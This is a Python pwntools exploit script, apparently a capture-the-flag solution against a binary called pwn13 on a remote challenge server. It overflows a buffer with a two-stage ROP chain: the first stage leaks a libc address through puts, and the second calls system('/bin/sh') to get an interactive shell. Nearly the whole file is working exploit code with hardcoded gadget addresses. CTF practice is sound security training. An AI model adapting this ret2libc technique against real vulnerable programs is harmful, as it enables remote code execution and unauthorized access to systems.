#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 ./bofish
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwn13')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
continue
'''.format(**locals())
#b *main+116
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = ELF('./libc.so.6')
pop_rdi = 0x4015f3
plt_puts = 0x4010d0
got_puts = 0x404020
main = 0x4014ac
rop = flat(pop_rdi, got_puts, plt_puts, main)
io.sendline(b'A' * 100 + b'\x7b' + rop)
io.recvuntil('\x9c\n')
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success(hex(leak))
libc.address = leak - libc.sym.puts
log.success(f'libc base @ {hex(libc.address)}')
rop2 = ROP(libc)
rop2.call(0x0000000000401581) #stack align
rop2.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(b'A' * 100 + b'\x7b' + rop2.chain())
io.interactive()
